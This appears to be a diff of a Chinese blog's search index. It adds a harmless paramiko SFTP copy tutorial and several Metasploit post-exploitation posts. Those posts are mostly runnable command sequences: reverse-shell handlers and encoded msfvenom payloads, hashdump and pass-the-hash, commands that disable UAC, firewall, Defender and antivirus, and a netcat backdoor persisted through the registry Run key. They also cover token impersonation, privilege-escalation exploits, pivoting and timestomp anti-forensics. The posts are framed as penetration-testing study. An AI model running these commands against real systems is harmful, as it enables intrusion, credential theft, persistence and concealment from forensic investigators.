@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>Python复制远程文件及文件目录到本地</title>
+      <link href="/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/"/>
+      <url>/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；</p><ul><li><p><strong>paramiko 模块内部依赖pycrypto，所以先导入pycrypto</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycrypto</span><br><span class="line">pip3 install paramiko</span><br></pre></td></tr></table></figure></li></ul></li><li><p>定义一个方法，用于远程复制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_file, local_file)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    sftp.get(remote_file, local_file)</span><br><span class="line">    scp.close()</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">"success"</span>)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">**注意这里的语句**</span><br><span class="line">`sftp.get(remote_file, local_file)` 中自带的get方法，只能拷贝文件，不能拷贝文件夹。</span><br><span class="line"></span><br><span class="line">* 然后调用这个方法：</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span></span><br><span class="line">    host_port = <span class="number">22</span></span><br><span class="line">    host_username = <span class="string">'root'</span></span><br><span class="line">    host_password = <span class="string">'password'</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    local_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)</span><br></pre></td></tr></table></figure></li></ul><p>这就是基本远程文件复制的功能实现。这里只能实现文件对文件的远程复制。</p><p>如果我们要远程复制整个文件夹。需要对上面的方法改进一下，加一段循环，让其能遍历远程目录里的所有文件，然后按照上面的方法依次复制到本地。</p><blockquote><p><strong>修改以后的完整代码如下</strong>:</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_path, local_path)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote_files = sftp.listdir(remote_path)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> remote_files:   <span class="comment">#遍历读取远程目录里的所有文件</span></span><br><span class="line">            local_file = local_path + file</span><br><span class="line">            remote_file = remote_path + file</span><br><span class="line">            sftp.get(remote_file, local_file)</span><br><span class="line">    <span class="keyword">except</span> IOError:   <span class="comment">#  如果目录不存在则抛出异常</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"remote_path or local_path is not exist"</span>)</span><br><span class="line">    scp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span>        <span class="comment"># 远程服务器IP</span></span><br><span class="line">    host_port = <span class="number">22</span>                   <span class="comment"># 远程服务器端口</span></span><br><span class="line">    host_username = <span class="string">'root'</span>           <span class="comment">#远程服务器用户名</span></span><br><span class="line">    host_password = <span class="string">'password'</span>       <span class="comment">#远程服务器密码</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/'</span>            <span class="comment">#这个是远程目录</span></span><br><span class="line">    local_path = <span class="string">'/tmp/'</span>             <span class="comment">#这个是本地目录</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)  <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+          <category> python运维 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> paramiko </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>暗网网站搭建和onion域名获取方法</title>
       <link href="/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/"/>
       <url>/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/</url>
@@ -50,6 +79,8 @@
         <tags>
             
             <tag> python </tag>
+            
+            <tag> import </tag>
             
         </tags>
       
@@ -305,9 +336,340 @@
     
     
     <entry>
+      <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
+      <link href="/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
+      <url>/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<h4 id="POST-模块-在已经取得meterpreter之后使用的模块"><a href="#POST-模块-在已经取得meterpreter之后使用的模块" class="headerlink" title="POST 模块(在已经取得meterpreter之后使用的模块)"></a><strong>POST 模块</strong>(在已经取得meterpreter之后使用的模块)</h4><p><strong>获取meterpreter</strong></p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 1.1.1.1set exitonsession false        #持续侦听端口配置参数exploit -j -z</code></pre><p><strong>常用POST模块</strong>    </p><pre><code>#在meterpreter下输入run按tab键会提示有大量POST模块和脚本run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24    #扫描目标网段run post/windows/gather/checkvm        #检查是否为虚拟机run post/windows/gather/credentials/credential_collector    #获取目标机器账号等身份认证信息run post/windows/gather/enum_applications        #获取目标机器安装的应用程序run post/windows/gather/enum_logged_on_users    #获取目标系统正在登录中的账号run post/windows/gather/enum_snmp                #查看目标系统是否开启snmp服务run post/multi/recon/local_exploit_suggester    #获取目标系统可用来本地提权的漏洞信息run post/windows/manage/delete_user USERNAME=yuanfh        #删除目标系统账号run post/multi/gather/env                #获取目标系统一些敏感信息run post/multi/gather/firefox_creds        #收集firefox浏览器保存的密码信息run post/multi/gather/ssh_creds            #获取本地保存的SSH身份验证信息,适用linuxrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe    #检查目标系统的某个程序是否为恶意程序</code></pre><h4 id="另一种运行POST模块的方法"><a href="#另一种运行POST模块的方法" class="headerlink" title="另一种运行POST模块的方法"></a><strong>另一种运行POST模块的方法</strong></h4><p><strong>自动执行meterpreter脚本</strong></p><pre><code>show advanced        #显示高级设置参数set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com    #进入meterpreter自动修改hosts文件set InitialAutoRunScript checkvm</code></pre><p><strong>利用高级设置参数自动执行POST模块</strong></p><pre><code>set InitialAutoRunScript migrate -n explorer.exe    #需先设置迁移目标用户权限的进程set AutoRunScript post/windows/gather/dumplinks        #再设置获取最近打开文档路径</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> dumplinks </tag>
+            
+            <tag> hosts编辑 </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> 迁移进程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之跳板利用及端口转发</title>
+      <link href="/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+      <url>/2016/03/14/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E8%B7%B3%E6%9D%BF%E5%88%A9%E7%94%A8%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Pivoting-跳板-枢纽-支点"><a href="#Pivoting-跳板-枢纽-支点" class="headerlink" title="Pivoting 跳板 / 枢纽 / 支点"></a><strong>Pivoting</strong> 跳板 / 枢纽 / 支点</h4><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其他内网计算机看来访问全部来自于跳板机</li><li><code>run autoroute -s 1.1.1.0/24</code><br>  #不能访问外网的被攻击目标内网网段</li></ul><p><strong>自动路由 现实场景</strong></p><ul><li>利用win 7攻击内网XP(对比xp有无外网访问权的情况)</li><li>扫描内网辅助模块: <code>auxiliary/scanner/portscan/tcp</code></li></ul><pre><code>use auxiliary/scanner/portscan/tcpshow optionsset rhosts 2.1.1.0/24set ports 139,445exploitdb_nmap -sV -p 445 2.1.1.11use exploit/windows/smb/ms08_067_netapishow optionsset rhost 2.1.1.11        #设置目标内网被攻击IPset payload windows/meterpreter/reverse_tcpset lhost 2.1.1.10        #设置反弹连接IP为跳板机set target 34</code></pre><p><strong>Pivoting之端口转发Portfwd</strong></p><ul><li>利用已经被控计算机,在kali与被攻击目标之间实现端口转发</li><li>也需要在已有session的前提下进入meterpreter内使用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L LIP -l LPORT -r RIP -p RPORT#添加端口转发规则</span><br><span class="line">portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</span><br><span class="line">portfwd list #查看已添加列表</span><br><span class="line">portfwd delete#删除某条规则</span><br><span class="line">portfwd flush#删除全部规则</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> 跳板机 </tag>
+            
+            <tag> portfwd </tag>
+            
+            <tag> autoroute </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之抓包及MACE时间修改</title>
+      <link href="/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/"/>
+      <url>/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8A%93%E5%8C%85%E5%8F%8AMACE%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9/</url>
+      
+        <content type="html"><![CDATA[<p><strong>抓包</strong>(meterpreter)</p><pre><code>load sniffersniffer_interfacessniffer_start 2sniffer_dump 2 1.cap / sniffer_dump 2 1.cap</code></pre><ul><li>在内存中缓存区块循环存储抓包(50000包),不写磁盘</li><li>智能过滤meterpreter流量,传输全程使用SSL/TLS加密</li></ul><p><strong>解码</strong></p><pre><code>use auxiliary/sniffer/psnuffleset PCAPFILE /root/1.cap</code></pre><p><strong>搜索文件</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search -f *.ini</span><br><span class="line">search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure></p><h4 id="John-the-Ripper-破解弱口令"><a href="#John-the-Ripper-破解弱口令" class="headerlink" title="John the Ripper 破解弱口令"></a><strong>John the Ripper 破解弱口令</strong></h4><pre><code>use post/windows/gather/hashdump        #system权限的meterpreterrun        #结果保存在/tmp目录下use auxiliary/analyze/jtr_crack_fastrun</code></pre><ul><li>文件系统访问会留下痕迹,电子取证重点关注</li><li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li><li>最好的避免被电子取证发现的方法:不要碰文件系统<ul><li>meterpreter的先天优势所在(完全基于内存)</li></ul></li></ul><p><strong>MAC时间</strong>(Modified Accessed Changed)</p><pre><code>ls -l --time=atime/mtime/ctime 1.txt    #查看MAC时间stat 1.txt                                #查看MAC时间touch -d &quot;2 days ago&quot; 1.txt                #修改MAC时间touch -t 1501010101 1.txt                #修改MAC时间</code></pre><ul><li>MACE:MFT entry<ul><li>MFT:NTFS文件系统的主文件分配表Master File Table</li><li>通常1024字节或2个硬盘扇区,其中存放多项entry信息</li><li>包含文件大量信息(大小,名称,目录位置,硬盘位置,创建日期)</li><li>更多信息可研究文件系统取证分析技术</li></ul></li></ul><p><strong>Timestomp</strong>(meterpreter)</p><pre><code>timestomp -v 1.txttimestomp -f c:\\autoexec.bat 1.txt        #指定一个文件模板改时间-b -r        #擦除MACE时间信息,目前此参数功能失效-m / -a / -c / -e / -z        #单独修改时间参数timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot; 2.txt        #统一修改所有时间</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> John </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> sniffer </tag>
+            
+            <tag> MACE时间修改 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之注册表修改</title>
+      <link href="/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/"/>
+      <url>/2016/03/13/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%AE%E6%94%B9/</url>
+      
+        <content type="html"><![CDATA[<p><strong>注册表保存着windows几乎全部配置参数</strong></p><ul><li>如果修改不当,可直接造成系统崩溃</li><li>修改前完整备份注册表</li><li>某些注册表的修改是不可逆的</li></ul><p><strong>常见用途</strong></p><ul><li>修改,增加启动项</li><li>窃取存储于注册表中的机密信息</li><li>绕过文件型病毒查杀</li></ul><h4 id="用注册表添加NC后门服务-meterpreter"><a href="#用注册表添加NC后门服务-meterpreter" class="headerlink" title="用注册表添加NC后门服务(meterpreter)"></a><strong>用注册表添加NC后门服务</strong>(meterpreter)</h4><pre><code>#上传NC工具到目标Windowsupload /usr/share/windows-binaries/nc.exe C:\\windows\\system32#使用reg子命令查询注册表键值reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run#增加nc子键值并配置nc正向连接参数,-d 静默执行 -L断开连接后不关闭端口reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&apos;#查询是否添加成功reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></pre><p><strong>打开防火墙端口</strong>(meterpreter)</p><pre><code>execute -f cmd -i -H    #进入交互式SHELLnetsh firewall show opmode    #查询防火墙状态netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL    #添加一条test规则并启动shutdown -r -t 0nc 1.1.1.1 444</code></pre><p><strong>其它注册表项</strong></p><pre><code>`https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart`</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> nc </tag>
+            
+            <tag> meterpreter </tag>
+            
+            <tag> 注册表 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之常用操作</title>
+      <link href="/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
+      <url>/2016/03/11/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
+      
+        <content type="html"><![CDATA[<p><strong>meterpreter</strong></p><pre><code>load privhashdump</code></pre><h4 id="Psexec-模块之Passthehash"><a href="#Psexec-模块之Passthehash" class="headerlink" title="Psexec 模块之Passthehash"></a><strong>Psexec 模块之Passthehash</strong></h4><ul><li><p><strong>利用hash直接登录目标windows系统</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set smbuser cat</span><br><span class="line">set smbpass hash</span><br><span class="line">set rhost 192.168.254.110</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.137</span><br></pre></td></tr></table></figure></li><li><p><strong>需要提前关闭UAC</strong> (meterpreter下依次执行以下指令)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v EnableLUA &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure></li><li><p><strong>关闭防火墙</strong></p><ul><li>需要管理员或system权限</li><li><code>shell</code></li><li><code>netsh advfirewall set allprofiles state off</code></li></ul></li><li><p><strong>关闭Windefend</strong> (win10自带防护)</p><ul><li><code>net stop windefend</code></li></ul></li><li><p><strong>Bitlocker 磁盘加密</strong></p><ul><li><code>manage-bde -off C:</code></li><li><code>manage-bde -status C:</code></li></ul></li><li><p><strong>关闭 DEP</strong> (数据执行保护)</p><ul><li><code>bcdedit.exe /set {current} nx AlwaysOff</code></li></ul></li><li><p><strong>杀死防病毒软件</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run killav</code></li><li><code>run post/windows/manage/killav</code></li></ul></li><li><p><strong>开启远程桌面服务</strong></p><ul><li><strong>meterpreter</strong></li><li><code>run post/windows/manage/enable_rdp</code>        开启远程</li><li><code>run multi_console_command -rc /root/.*.txt</code>        关闭远程</li><li><code>run getgui –e</code><ul><li><code>run getgui -u owl -p 12313</code>        #添加一条远程账号组的账号</li><li><code>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</code></li></ul></li></ul></li><li><p><strong>查看远程桌面</strong></p><ul><li>screenshot    #屏幕截图</li><li>use espia    #加载截图插件<ul><li>screengrab    #屏幕截图</li></ul></li></ul></li></ul><h4 id="Tokens-插件"><a href="#Tokens-插件" class="headerlink" title="Tokens 插件"></a><strong>Tokens</strong> 插件</h4><ul><li><p>用户每次登录,账号绑定临时的token</p></li><li><p>访问资源时提交token进行身份验证,类似于WEB Cookie</p></li><li><p>Delegate Token: 交互登录会话</p></li><li><p>Impersonate Token: 非交互登录会话</p></li><li><p>Delegate Token账号注销后变为Impersonate Token,权限依然有效</p></li><li><p><strong>Incognito</strong></p><ul><li>独立功能的软件,被MSF集成在meterpreter中</li><li>无需密码破解或获取密码HASH,窃取Token将自己伪装成其他用户</li><li>尤其适用于域环境下提权渗透多操作系统</li></ul></li></ul><p><strong>搭建域环境</strong></p><ul><li><p>dcpromo Win03 + XP</p></li><li><p>XP DNS指向03域服务器IP</p></li><li><p><code>load incognito</code></p><ul><li><p><code>list_tokens -u</code>    #查看token列表</p></li><li><p><code>impersonate_token lab\\administrator</code> #伪装域管理员token</p></li><li><p>运行以上命令需要getsystem</p><ul><li><p>本地普通权限用户需先本地提权</p></li><li><p><code>use exploit/windows/local/ms10_015_kitrap0d</code></p><ul><li><code>show options</code></li><li><code>set session 1</code></li><li><code>set lhost 192.168.190.137</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>exploit -j</code></li></ul></li><li><p><code>execute -f cmd.exe -i -t</code>    # -t:使用当前假冒token执行程序</p></li><li><p><code>shell</code> </p></li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> hashdump </tag>
+            
+            <tag> incognito </tag>
+            
+            <tag> token窃取 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF后渗透测试阶段之提权</title>
+      <link href="/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
+      <url>/2016/03/10/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>已经获得目标系统控制权后扩大站果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>后门持久化</li></ul></li><li><p>基于已有session扩大站果</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exe</span><br></pre></td></tr></table></figure></li></ul><h4 id="获取system账号权限"><a href="#获取system账号权限" class="headerlink" title="获取system账号权限"></a><strong>获取system账号权限</strong></h4><p><strong>meterpreter</strong></p><pre><code>load privgetsystempriv_elevate_getsystem: Operation failed: Access is denied.</code></pre><ul><li>使用 <code>exploit/windows/local</code>下的模块 <strong>绕过UAC限制</strong> 进行getsystem提权  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#发起弹窗询问UAC权限赋予</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set filename up_data.exe</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#直接绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">info</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j#执行后获取一个新的能getsystem的session</span><br><span class="line"></span><br><span class="line">#注入dll动态链接库文件,绕过UAC</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">set session</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.190.176</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure></li></ul><h4 id="利用漏洞直接提权为-system"><a href="#利用漏洞直接提权为-system" class="headerlink" title="利用漏洞直接提权为 system"></a><strong>利用漏洞直接提权为 system</strong></h4><pre><code>#利用本地已有漏洞直接提权为SYSTEMuse exploit/windows/local/ms13_053_schlampereiinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_081_track_popup_menuinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -juse exploit/windows/local/ms13_097_ie_registry_symlinkinfoset session 1set payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176show optionsexploit -juse exploit/windows/local/ppr_flatten_recinfoset payload windows/meterpreter/reverse_tcpset lhost 192.168.190.176set session 1show optionsexploit -j</code></pre><p><strong>图形化payload</strong></p><pre><code>#利用VNC注入模块获取图形化payloadset payload windows/vncinject/reverse_tcpshow optionsset session 1set lhost 192.168.190.176set viewonly no        #可操作</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 内网渗透 </tag>
+            
+            <tag> 后门持久化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF客户端渗透</title>
